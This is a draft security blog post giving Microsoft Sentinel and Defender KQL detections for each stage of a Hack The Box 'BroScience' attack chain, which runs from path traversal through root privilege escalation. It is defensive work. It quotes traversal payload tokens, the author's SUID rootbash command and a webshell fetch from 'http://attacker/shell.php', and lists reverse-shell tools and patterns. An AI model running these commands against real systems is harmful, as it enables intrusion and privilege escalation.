---
title: "BroScience — Detection: Catching the Chain in Sentinel and Defender XDR"
summary: "No CVE, no signature, no solution to install. What each stage of the chain leaves in telemetry, and nine queries built on those artifacts rather than on the bugs."
date: 2026-09-06
draft: true
tier: full
categories:
  - Defensive
tags:
  - BroScience
  - Hack The Box
  - Linux
  - KQL
  - Detection Engineering
  - Microsoft Sentinel
  - Defender for Endpoint
  - Sigma
ShowToc: true
TocOpen: false
---

Detection companion to the [BroScience attack writeup](../../offensive/broscience/). What the chain looks like in telemetry, and the queries I would deploy against it.

## There is no CVE here

Every vulnerability on this box is bespoke application code. No CVE ID, no vendor advisory, no signature, no Sentinel solution to install. Signature-based detection catches none of it.

That being said, the behavior is detectable: the artifacts each stage leaves behind regardless of the specific bug that produced them. That is also what makes this chain worth writing up defensively, because the detections below generalize well past this singular application.

### How the queries are labelled

- **[Translated]** means the detection logic comes from a published Sigma rule, and the KQL below is my translation of it. Sigma rules are YAML, not KQL, so anything presented here in KQL is my own rendering of published logic rather than a reproduction of published KQL.
- **[Mine]** means I wrote it against the observable behavior of this chain. Not published anywhere.

I have deliberately not reproduced Sigma rule UUIDs, author names, or dates. Verify the rule filenames and their `condition:` blocks against the current SigmaHQ repo before relying on anything below that references them.

### Telemetry prerequisites

| Stage | Required telemetry | Table |
|---|---|---|
| Traversal, token brute force | Web server access logs, normalised | ASIM `_Im_WebSession` |
| Deserialization payload | Full request capture including the Cookie header | WAF / ModSecurity audit log / reverse proxy, custom table |
| Webshell, RCE, privesc | Defender for Endpoint on Linux | `DeviceProcessEvents`, `DeviceFileEvents`, `DeviceNetworkEvents` |
| Fallback without MDE | auditd forwarded to Sentinel | Syslog, or ASIM process-event parsers |

{{< callout icon="🚨" kind="warning" >}}
Default Apache `combined` logging does not record request headers, so the de-serialization cookie is invisible at the web tier. If you run PHP anywhere, log the Cookie header (or at minimum its length and a hash) at the WAF or reverse proxy. D2 below is the highest-fidelity detection in this document and it is impossible without that data.
{{< /callout >}}

## D1. Encoded path traversal attempts

**[Translated]** from the SigmaHQ web path traversal exploitation attempt rule. The upstream string list is narrow because it targets known nuclei payloads. I kept the intent, broadened the encoding coverage to include the bypasses that actually worked on this box, and added a double URL-decode so the alert fires on semantics rather than on a literal string.

ATT&CK: T1190, T1083

```kusto
let lookback = 7d;
let minAttempts = 3;
let traversalTokens = dynamic([
    "../../../etc/",
    "..%2f", "..%5c",
    "..%252f", "..%255c",      // double-encoded, used on this box
    "..%25%32%66",             // percent-of-percent, used on this box
    "%252e%252e%252f",
    "..%c0%af", "..%c1%9c",    // overlong UTF-8
    "....//",
    "..%00/", "..%01/"
]);
_Im_WebSession(starttime=ago(lookback))
| where Url has_any (traversalTokens)
| extend DecodedOnce  = url_decode(Url)
| extend DecodedTwice = url_decode(DecodedOnce)
| where DecodedTwice matches regex @"(?i)(\.\.[\\/]){2,}"
| extend TargetFile = extract(@"(?i)((?:/[\w.\-]+){1,})$", 1, DecodedTwice)
| extend HighValueTarget = TargetFile has_any (
      "/etc/passwd","/etc/shadow","/proc/self/environ",".php",".env",
      "config.php","db_connect.php","wp-config.php",".git/config","id_rsa")
| summarize
      Attempts        = count(),
      DistinctTargets = dcount(DecodedTwice),
      HitHighValue    = countif(HighValueTarget),
      SampleTargets   = make_set(TargetFile, 15),
      StatusCodes     = make_set(EventResultDetails, 10),
      FirstSeen       = min(TimeGenerated),
      LastSeen        = max(TimeGenerated)
      by SrcIpAddr, DstIpAddr
| where Attempts >= minAttempts
| extend Severity = case(HitHighValue > 0 and Attempts > 20, "High",
                         HitHighValue > 0,                   "Medium",
                                                             "Low")
| order by HitHighValue desc, Attempts desc
```

Internet-facing hosts see constant background traversal from scanners. What separates this box from noise is success. Filter to a 200 status with a non-zero response size and prioritise `HitHighValue`. A traversal attempt that returns 200 with a body is a working LFI, not a scanner.

## D2. Serialized object of an unexpected class in a cookie

**[Mine].** There is no published Sigma or Sentinel rule for PHP object injection in a cookie, so this is built from the behaviour.

A PHP serialized object always begins `O:<len>:"<ClassName>"`, which base64-encodes to something starting with `Tzo`. This application only ever legitimately emits one class in this cookie, `UserPrefs`. So the rule is not "detect serialized data", which is normal traffic here. It is "detect a serialized object whose class name is not the one this application produces", which is close to zero false positive.

ATT&CK: T1190. CWE-502.

```kusto
// Replace WebRequestFull_CL and the field names with your own capture table's schema.
let expectedClasses = dynamic(["UserPrefs"]);   // the ONLY classes your app serializes to clients
let dangerousSinkHints = dynamic([
    "http://","https://","ftp://","data://","php://","phar://","expect://","file://",
    "/var/www","/tmp/","/dev/shm","/etc/","system","exec","passthru","shell_exec","eval"
]);
WebRequestFull_CL
| where isnotempty(CookieHeader_s)
| mv-expand Cookie = split(CookieHeader_s, ";")
| extend Cookie      = trim(" ", tostring(Cookie))
| extend CookieName  = tostring(split(Cookie, "=")[0])
| extend CookieValue = substring(Cookie, indexof(Cookie, "=") + 1)
| extend DecodedB64  = base64_decode_tostring(url_decode(CookieValue))
| where DecodedB64 startswith "O:" or DecodedB64 startswith "a:" or DecodedB64 startswith "C:"
| extend InjectedClass = extract(@'^[OC]:\d+:"([^"]+)"', 1, DecodedB64)
| extend PropertyCount = toint(extract(@'^[OC]:\d+:"[^"]+":(\d+):', 1, DecodedB64))
| extend SuspiciousValues = tostring(extract_all(@'s:\d+:"([^"]{4,})"', DecodedB64))
| extend HasSinkHint = SuspiciousValues has_any (dangerousSinkHints)
| where (isnotempty(InjectedClass) and InjectedClass !in~ (expectedClasses)) or HasSinkHint
| project TimeGenerated, SrcIpAddr = ClientIP_s, RequestUri = RequestUri_s,
          CookieName, InjectedClass, PropertyCount, SuspiciousValues, HasSinkHint,
          RawDeserialized = DecodedB64
| extend Verdict = case(HasSinkHint and isnotempty(InjectedClass), "CRITICAL - gadget object with sink-bound properties",
                        isnotempty(InjectedClass),                 "HIGH - unexpected class injected via cookie",
                                                                   "MEDIUM - review serialized payload")
| order by TimeGenerated desc
```

### Generalising it

The same shape applies anywhere an app hands serialized state to a client. The magic bytes are the detection primitive:

| Runtime | Base64 prefix |
|---|---|
| PHP serialized object | `Tzo` |
| Java serialization | `rO0AB` |
| .NET BinaryFormatter | `AAEAAAD/////` |
| Python pickle (protocols 2 to 4) | `gASV`, `gANj`, `gAJ` |
| Ruby Marshal | `BAh` |

```kusto
// Universal serialized-payload canary across any request field
let serializationMagic = dynamic(["rO0AB","AAEAAAD/////","gASV","gANj","BAh","Tzo","phar://"]);
_Im_WebSession(starttime=ago(7d))
| where Url has_any (serializationMagic) or tostring(HttpUserAgent) has_any (serializationMagic)
| project TimeGenerated, SrcIpAddr, DstIpAddr, Url, HttpUserAgent, EventResultDetails
| order by TimeGenerated desc
```

## D3. Web server process making an outbound connection

**[Mine].** Even with zero cookie logging this stage is catchable, because the gadget's sink is `file_get_contents("http://attacker/shell.php")`. A web server initiating an outbound HTTP request to an external host is anomalous in most architectures. Web servers serve, they do not browse.

This is the one I would deploy first. It also covers SSRF, remote file inclusion, XXE with external entities, JNDI callbacks, dependency confusion callbacks, and most webshell stagers.

ATT&CK: T1190, T1105

```kusto
let webServerProcs = dynamic(["apache2","httpd","nginx","php-fpm","php","php7.4","php8.1","php8.2","lighttpd","caddy","tomcat"]);
let internalRanges = dynamic(["10.0.0.0/8","172.16.0.0/12","192.168.0.0/16","127.0.0.0/8","169.254.0.0/16"]);
let expectedEgressPorts = dynamic([53, 443]);   // baseline yours: package mirrors, APIs, OCSP
DeviceNetworkEvents
| where TimeGenerated > ago(7d)
| where ActionType in ("ConnectionSuccess","ConnectionAttempt")
| where InitiatingProcessFileName has_any (webServerProcs)
| where isnotempty(RemoteIP)
| where not(ipv4_is_in_any_range(RemoteIP, internalRanges))
| where RemotePort !in (expectedEgressPorts)
      or RemotePort in (8000, 8080, 8081, 8888, 4444, 4443, 9001, 1337, 31337)
| project TimeGenerated, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessAccountName, RemoteIP, RemotePort, RemoteUrl, ReportId
| extend Verdict = case(RemotePort in (4444, 9001, 1337, 31337), "CRITICAL - classic listener port",
                        RemotePort in (8000, 8080, 8888),        "HIGH - classic payload staging port",
                                                                 "MEDIUM - unexpected egress from web tier")
| order by TimeGenerated asc
```

{{< callout icon="🕳️" kind="warning" >}}
Coverage gap, stated up front. The `data://text/plain;base64,...` variant mentioned in the attack writeup inlines the payload and needs no listener, so it produces no outbound connection and defeats this query completely. It does not defeat D2, because the cookie still carries a `data://` string, which is why `data://` and `php://` are in that sink-hint list. It does not defeat D4 either, because the file still lands in the web root.

This is the argument for layering network, request and file telemetry instead of picking one. Any single-layer strategy here has a one-line bypass.
{{< /callout >}}

## D4. Executable script written into the web root by the web server

**[Mine].** ATT&CK: T1505.003

```kusto
let webRoots = dynamic(["/var/www/","/srv/http/","/srv/www/","/usr/share/nginx/","/opt/lampp/htdocs/","/home/site/wwwroot/"]);
let scriptExtensions = dynamic([".php",".phtml",".php3",".php4",".php5",".php7",".phar",".inc",
                                ".jsp",".jspx",".asp",".aspx",".ashx",".cfm",".pl",".cgi"]);
let webAccounts = dynamic(["www-data","apache","httpd","nginx","http","daemon","tomcat","_www"]);
DeviceFileEvents
| where TimeGenerated > ago(7d)
| where ActionType in ("FileCreated","FileModified","FileRenamed")
| where FolderPath has_any (webRoots)
| where FileName has_any (scriptExtensions)
| where InitiatingProcessAccountName in~ (webAccounts)
      or InitiatingProcessFileName in~ ("apache2","httpd","nginx","php-fpm","php")
| project TimeGenerated, DeviceName, FolderPath, FileName, ActionType, SHA256,
          InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName,
          InitiatingProcessParentFileName, ReportId
| order by TimeGenerated asc
```

Tuning is mandatory. Legitimate writes into a web root come from CI/CD deploys, CMS auto-updates, and cache or compiled-template directories. Baseline for 30 days then exclude by deployment service account and path, never by process name alone.

Worth noting that the initiating process here is `apache2` itself, not a shell. Webshell rules keyed on "shell spawned by web server" miss the drop entirely and only catch the use.

## D5. Any unexpected child of the web tier

**[Mine].** The two published webshell rules I looked at (the SigmaHQ Linux webshell indicators rule, and the WebshellDetection rule from Bert-JanP's Hunting-Queries-Detection-Rules repo) are both blocklists. They enumerate bad child processes: `whoami`, `ifconfig`, `uname`, `cat` and so on.

Both would have fired on the first thing I did after dropping the shell, `shell.php?cmd=id`. Both have gaps. The SigmaHQ list does not include `id` or `sudo`, and neither fires if the attacker's first command is the reverse shell one-liner, because `bash` is not in the list.

A PHP web server has a very small legitimate child process set, so the allowlist inversion is what I would actually deploy.

ATT&CK: T1505.003, T1059.004

```kusto
let webServerProcs = dynamic(["apache2","httpd","nginx","php-fpm","php","php7.4","php8.1","php8.2"]);
// Baseline THIS for your app before deploying. Most PHP apps need almost nothing here.
let expectedChildren = dynamic(["sendmail","postdrop","sh","logrotate","php","convert","gs","ffmpeg","identify"]);
DeviceProcessEvents
| where TimeGenerated > ago(7d)
| where InitiatingProcessFileName in~ (webServerProcs)
      or InitiatingProcessParentFileName in~ (webServerProcs)
| where FileName !in~ (expectedChildren)
| extend Recon    = FileName in~ ("id","whoami","uname","hostname","ifconfig","ip","netstat","ss","ps","sudo","find","getent")
| extend Download = FileName in~ ("curl","wget","nc","ncat","socat","ftp","tftp","scp","python3","perl")
| extend Shell    = FileName in~ ("bash","dash","zsh","ksh","csh")
| extend Database = FileName in~ ("psql","mysql","mongo","redis-cli","sqlite3")
| project TimeGenerated, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName,
          Recon, Download, Shell, Database, ReportId
| extend Verdict = case(Shell,    "CRITICAL - interactive shell from web tier",
                        Download, "HIGH - tool transfer / egress from web tier",
                        Database, "HIGH - direct database client from web tier",
                        Recon,    "MEDIUM - host reconnaissance from web tier",
                                  "LOW - unexpected child process")
| order by TimeGenerated asc
```

The `Database` branch is worth calling out separately. This application talks to Postgres through the PHP driver, which is a library call inside the `apache2` process. It never shells out to the `psql` binary. So `www-data` executing `psql` is by construction not the application.

## D6. SUID bit set on a shell binary

**[Translated], with a correction.** The published SigmaHQ setuid/setgid rule for Linux process creation looks like this:

```yaml
title: Setuid and Setgid
status: test
description: Detects suspicious change of file privileges with chown and chmod commands
logsource:
    product: linux
    category: process_creation
detection:
    selection_root:
        CommandLine|contains: 'chown root'
    selection_perm:
        CommandLine|contains:
            - ' chmod u+s'
            - ' chmod g+s'
    condition: all of selection_*
level: low
```

{{< callout icon="❗" kind="warning" >}}
This rule would have missed the BroScience privilege escalation entirely. The condition is `all of selection_*`, so it requires both `chown root` and `chmod u+s` in the same command line.

My payload was `cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash`. There is no `chown root` in it, because cron already runs as root so the copy is root-owned on creation. And it uses `chmod +s`, not `chmod u+s`. Two independent reasons it does not fire, and `level: low` compounds it.

The transferable point: published rules encode the author's assumed attack shape, not the technique's full surface. Read the `condition:` line, not the title. An AND where you assumed an OR is the difference between a control and a placebo.
{{< /callout >}}

Corrected and broadened. ATT&CK: T1548.001

```kusto
DeviceProcessEvents
| where TimeGenerated > ago(7d)
| where FileName in~ ("chmod","chown","install","setcap") or ProcessCommandLine has_any ("chmod","setcap","install -m")
| where
      // symbolic: +s, u+s, g+s, ug+s, a+s
      ProcessCommandLine matches regex @"(?i)\bchmod\b(\s+-[a-zA-Z]+)*\s+[ugoa]*\+[rwx]*s"
      // octal: leading 2 (sgid), 4 (suid), 6 or 7 (both)
      or ProcessCommandLine matches regex @"(?i)\bchmod\b(\s+-[a-zA-Z]+)*\s+[2467][0-7]{3}\b"
      or ProcessCommandLine matches regex @"(?i)\binstall\b.*-m\s*[2467][0-7]{3}"
      // capabilities are the modern equivalent and are frequently missed
      or ProcessCommandLine matches regex @"(?i)\bsetcap\b.*cap_(setuid|setgid|dac_override|sys_admin|sys_ptrace)"
| extend TargetPath = extract(@"(\/[^\s]+)\s*$", 1, ProcessCommandLine)
| extend TargetIsShell = TargetPath has_any ("bash","sh","dash","zsh","ksh","busybox","python","perl","php","ruby","node","find","awk","vim","nmap")
| extend TargetInWritableDir = TargetPath startswith "/tmp/" or TargetPath startswith "/dev/shm/"
                               or TargetPath startswith "/var/tmp/" or TargetPath startswith "/home/"
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, TargetPath,
          TargetIsShell, TargetInWritableDir,
          InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, ReportId
| extend Verdict = case(TargetIsShell and TargetInWritableDir, "CRITICAL - SUID shell staged in a writable directory",
                        TargetIsShell,                         "HIGH - SUID bit set on an interpreter or shell",
                        TargetInWritableDir,                   "HIGH - SUID binary in a writable directory",
                                                               "MEDIUM - review SUID/SGID change")
| order by TimeGenerated asc
```

File-side companion, which catches the `cp /bin/bash` staging even when the `chmod` is missed:

```kusto
DeviceFileEvents
| where TimeGenerated > ago(7d)
| where ActionType in ("FileCreated","FileModified")
| where InitiatingProcessCommandLine matches regex @"(?i)\b(cp|install|cat|dd)\b.*\/(usr\/)?bin\/(ba|da|z|k)?sh\b"
| project TimeGenerated, DeviceName, FolderPath, FileName, SHA256,
          InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, ReportId
```

## D7. Root scheduled job spawning an unexpected child

**[Mine].** Regardless of how the payload got into the certificate, when it detonates it produces a process. `renew_cert.sh` has a small, knowable set of legitimate children, so anything outside that set running as root under cron is the compromise, visible in one row.

This is also the structural detection for the whole class of "root job reads a user-writable file" bugs.

ATT&CK: T1053.003, T1068

```kusto
let schedulers = dynamic(["cron","crond","CRON","anacron","systemd","run-parts","atd"]);
// Baseline per script. For /opt/renew_cert.sh the legitimate children are exactly these:
let renewCertExpectedChildren = dynamic(["openssl","cut","grep","awk","echo","mv","cp","bash","sh",
                                         "dirname","basename","date","cat","sed","tr","logger","expr","test"]);
DeviceProcessEvents
| where TimeGenerated > ago(7d)
| where AccountName == "root"
| where InitiatingProcessCommandLine has "renew_cert.sh"
      or InitiatingProcessParentFileName in~ (schedulers)
      or InitiatingProcessFileName in~ (schedulers)
| where FileName !in~ (renewCertExpectedChildren)
| extend Suspicious = FileName in~ ("chmod","chown","cp","curl","wget","nc","ncat","socat","python3",
                                    "perl","useradd","usermod","passwd","ssh-keygen","base64","setcap","insmod")
| project TimeGenerated, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName,
          ProcessId, InitiatingProcessId, ReportId
| extend Verdict = iff(Suspicious, "CRITICAL - privilege-abusing binary spawned by root scheduled job",
                                   "HIGH - unexpected child of root scheduled job")
| order by TimeGenerated asc
```

Rather than hand-maintaining the allowlist, learn it:

```kusto
// Anomaly variant: a child process never previously seen for this scheduled job
let baselineWindow = 30d;
let detectionWindow = 1d;
let baseline =
    DeviceProcessEvents
    | where TimeGenerated between (ago(baselineWindow) .. ago(detectionWindow))
    | where InitiatingProcessParentFileName in~ ("cron","crond","CRON","systemd")
    | summarize by DeviceName, ParentCmd = InitiatingProcessCommandLine, FileName;
DeviceProcessEvents
| where TimeGenerated > ago(detectionWindow)
| where InitiatingProcessParentFileName in~ ("cron","crond","CRON","systemd")
| extend ParentCmd = InitiatingProcessCommandLine
| join kind=leftanti (baseline) on DeviceName, ParentCmd, FileName
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, ParentCmd, ReportId
| order by TimeGenerated asc
```

## D8. Unexplained UID transition to root

**[Mine].** If you deploy exactly one privilege escalation detection, this is the one. It is technique-agnostic. It does not care whether root was reached through a SUID binary, a kernel exploit, cron injection, a container escape, or a Docker socket. It asks whether a process became root without going through a sanctioned elevation path.

ATT&CK: T1068, T1548

```kusto
let sanctionedElevators = dynamic(["sudo","su","doas","pkexec","systemd","systemd-logind","sshd","sshd-session",
                                   "login","cron","crond","CRON","init","agetty","polkitd","gdm-session-worker",
                                   "dbus-daemon","containerd-shim","runc","dockerd","snapd","unattended-upgrade"]);
DeviceProcessEvents
| where TimeGenerated > ago(7d)
| where AccountName == "root"
| where isnotempty(InitiatingProcessAccountName)
| where InitiatingProcessAccountName !in~ ("root","system","")
| where InitiatingProcessFileName !in~ (sanctionedElevators)
| project TimeGenerated, DeviceName,
          FromAccount = InitiatingProcessAccountName,
          ToAccount   = AccountName,
          ParentProcess = InitiatingProcessFileName,
          ParentCommandLine = InitiatingProcessCommandLine,
          FileName, FolderPath, ProcessCommandLine,
          ProcessId, InitiatingProcessId, ReportId
| extend PrivilegedShell = FileName in~ ("bash","sh","dash","zsh","rootbash")
                           and ProcessCommandLine matches regex @"(?i)\s-p\b"
| extend Verdict = iff(PrivilegedShell, "CRITICAL - privileged shell obtained via SUID (-p flag)",
                                        "HIGH - unexplained privilege transition to root")
| order by TimeGenerated asc
```

The `-p` check earns its own note. `bash -p` is how you use a SUID bash and it has close to zero legitimate use. If you want one alert covering the entire privilege escalation stage of this box: `FileName == "bash"`, `ProcessCommandLine has " -p"`, `AccountName == "root"`, `InitiatingProcessAccountName != "root"`.

## D9. Full-chain correlation

Individual alerts are not an incident. This builds a per-host timeline of every stage and only surfaces hosts showing multiple stages inside a correlation window, which is what is actually worth paging someone about.

```kusto
let window = 24h;
let webServerProcs = dynamic(["apache2","httpd","nginx","php-fpm","php"]);
let stages =
    union isfuzzy=true
    (
        DeviceNetworkEvents
        | where TimeGenerated > ago(window)
        | where InitiatingProcessFileName has_any (webServerProcs)
        | where not(ipv4_is_in_any_range(RemoteIP, dynamic(["10.0.0.0/8","172.16.0.0/12","192.168.0.0/16","127.0.0.0/8"])))
        | project TimeGenerated, DeviceName, Stage = "1-ExploitPayloadFetch",
                  Detail = strcat(InitiatingProcessFileName, " -> ", RemoteIP, ":", tostring(RemotePort)),
                  Account = InitiatingProcessAccountName
    ),
    (
        DeviceFileEvents
        | where TimeGenerated > ago(window)
        | where ActionType in ("FileCreated","FileModified")
        | where FolderPath has_any ("/var/www/","/srv/http/","/usr/share/nginx/")
        | where FileName has_any (".php",".phtml",".jsp",".aspx",".phar")
        | where InitiatingProcessAccountName in~ ("www-data","apache","nginx","http","daemon")
        | project TimeGenerated, DeviceName, Stage = "2-WebshellDropped",
                  Detail = FolderPath, Account = InitiatingProcessAccountName
    ),
    (
        DeviceProcessEvents
        | where TimeGenerated > ago(window)
        | where InitiatingProcessFileName has_any (webServerProcs)
        | where FileName in~ ("bash","sh","dash","id","whoami","uname","curl","wget","nc","python3","psql")
        | project TimeGenerated, DeviceName, Stage = "3-WebshellExecuted",
                  Detail = ProcessCommandLine, Account = AccountName
    ),
    (
        DeviceProcessEvents
        | where TimeGenerated > ago(window)
        | where ProcessCommandLine has_any ("/dev/tcp/","pty.spawn")
             or ProcessCommandLine matches regex @"(?i)\b(bash|sh)\b\s+-i\s+.*>&"
        | project TimeGenerated, DeviceName, Stage = "4-ReverseShell",
                  Detail = ProcessCommandLine, Account = AccountName
    ),
    (
        DeviceProcessEvents
        | where TimeGenerated > ago(window)
        | where FolderPath startswith "/tmp/" or FolderPath startswith "/dev/shm/"
        | where FileName has_any ("pspy","linpeas","LinEnum","lse.sh","deepce","traitor")
        | project TimeGenerated, DeviceName, Stage = "5-PrivescEnum",
                  Detail = ProcessCommandLine, Account = AccountName
    ),
    (
        DeviceProcessEvents
        | where TimeGenerated > ago(window)
        | where (ProcessCommandLine matches regex @"(?i)\bchmod\b.*(\+s|\b[2467][0-7]{3}\b)")
             or (AccountName == "root"
                 and InitiatingProcessAccountName !in~ ("root","system","")
                 and InitiatingProcessFileName !in~ ("sudo","su","doas","pkexec","systemd","sshd","cron","crond","CRON","login"))
        | project TimeGenerated, DeviceName, Stage = "6-PrivilegeEscalation",
                  Detail = ProcessCommandLine, Account = AccountName
    );
stages
| summarize
      StagesObserved = dcount(Stage),
      StageList      = make_set(Stage),
      Timeline       = make_list(pack("t", TimeGenerated, "stage", Stage, "detail", substring(Detail, 0, 200), "acct", Account), 60),
      FirstSeen      = min(TimeGenerated),
      LastSeen       = max(TimeGenerated)
      by DeviceName
| where StagesObserved >= 3
| extend DwellMinutes = datetime_diff('minute', LastSeen, FirstSeen)
| extend Severity = case(StageList has "6-PrivilegeEscalation", "CRITICAL - full chain to root",
                         StagesObserved >= 4,                   "HIGH - multi-stage intrusion",
                                                                "MEDIUM - correlate further")
| order by StagesObserved desc, LastSeen desc
```

## Deploying D7 as a Sentinel analytics rule

```yaml
name: Root scheduled job spawned an unexpected child process
description: |
  Detects a process running as root, parented by cron/systemd or by a known maintenance
  script, whose executable is outside that job's established child-process set. This is
  the terminal artifact of command injection into a privileged scheduled task (CWE-78),
  regardless of how the injected data reached the job.
severity: High
requiredDataConnectors:
  - connectorId: MicrosoftThreatProtection
    dataTypes:
      - DeviceProcessEvents
queryFrequency: 15m
queryPeriod: 15m
triggerOperator: gt
triggerThreshold: 0
tactics:
  - PrivilegeEscalation
  - Execution
relevantTechniques:
  - T1053.003
  - T1068
query: |
  let schedulers = dynamic(["cron","crond","CRON","anacron","systemd","run-parts","atd"]);
  let expectedChildren = dynamic(["openssl","cut","grep","awk","echo","mv","cp","bash","sh",
                                  "dirname","basename","date","cat","sed","tr","logger","expr","test",
                                  "find","tar","gzip","rsync","logrotate","apt","dpkg"]);
  DeviceProcessEvents
  | where AccountName == "root"
  | where InitiatingProcessParentFileName in~ (schedulers)
       or InitiatingProcessFileName in~ (schedulers)
  | where FileName !in~ (expectedChildren)
  | extend Suspicious = FileName in~ ("chmod","chown","curl","wget","nc","ncat","socat",
                                      "python3","perl","useradd","usermod","passwd",
                                      "ssh-keygen","base64","setcap","insmod","nsenter")
  | project TimeGenerated, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine,
            InitiatingProcessFileName, InitiatingProcessCommandLine,
            InitiatingProcessParentFileName, ProcessId, ReportId, Suspicious
entityMappings:
  - entityType: Host
    fieldMappings:
      - identifier: HostName
        columnName: DeviceName
  - entityType: Account
    fieldMappings:
      - identifier: Name
        columnName: AccountName
  - entityType: Process
    fieldMappings:
      - identifier: CommandLine
        columnName: ProcessCommandLine
version: 1.0.0
kind: Scheduled
```

## Preventive controls

Detection is the backstop. These are the controls that mean the alert never has to fire.

| Stage | Control | Effect on this chain |
|---|---|---|
| LFI | ModSecurity with CRS 930100/930110, `urlDecodeUni` applied twice | Blocks the double-encoded traversal at the edge |
| LFI | `open_basedir` restricting PHP to the document root | PHP cannot read `/etc/passwd` or anything outside the app |
| Token | Rate limiting and lockout on `/activate.php`; single-use, short-TTL, CSPRNG tokens | Eleven guesses becomes a lockout and an alert |
| Deserialization | `allow_url_fopen = Off` | Removes the remote-fetch half of the gadget |
| Deserialization | Document root not writable by `www-data` (`root:www-data`, 0755) | `fwrite` fails, no webshell, no foothold. Highest-value single control here. |
| Deserialization | `disable_functions` for system/exec/passthru/shell_exec/popen | The webshell is inert even if it lands |
| C2 | Default-deny egress from the web tier, allowlist mirrors and required APIs | Payload fetch and reverse shell both fail, and the denied connection is itself a high-fidelity alert |
| Credentials | Secrets outside the web root, least-privilege DB role, Argon2id hashing | LFI yields no credentials, cracked hashes yield nothing usable |
| Privesc | Root jobs never read from user-writable paths; move the cert store to `/etc/ssl/` | Removes attacker control of the input, the bug becomes unreachable |
| Privesc | Quote all expansions, shellcheck SC2086 in CI, run the job as a non-root service account | Fixes the injection and caps the blast radius if it recurs |
| Privesc | Mount `/tmp`, `/dev/shm` and `/var/tmp` with `nosuid,nodev,noexec` | The SUID rootbash in `/tmp` is neutered even after successful injection |

{{< callout icon="🛡️" kind="win" >}}
If I had to pick two: `chmod 0755 /var/www/html` with `root:www-data` ownership kills the foothold, and `nosuid` on `/tmp` kills the privilege escalation. Neither requires touching application code, and together they break the chain in two independent places.
{{< /callout >}}

## Upstream references

- SigmaHQ/sigma: web path traversal exploitation attempt, Linux webshell indicators, setuid/setgid process creation, Linux back-connect shell network connection.
- Bert-JanP/Hunting-Queries-Detection-Rules: WebshellDetection (T1505.003).
- Azure/Azure-Sentinel: ASIM parsers (`_Im_WebSession`), Apache HTTP Server solution and parser.
- Azure/Azure-Sentinel-Notebooks: Entity Explorer for Linux Host, IP Address and Account. The Linux Host notebook is the right thing to open when D7 or D8 fires.

---

*Everything labelled [Mine] was written for this chain and has not been validated in a production environment. Test before deploying.*
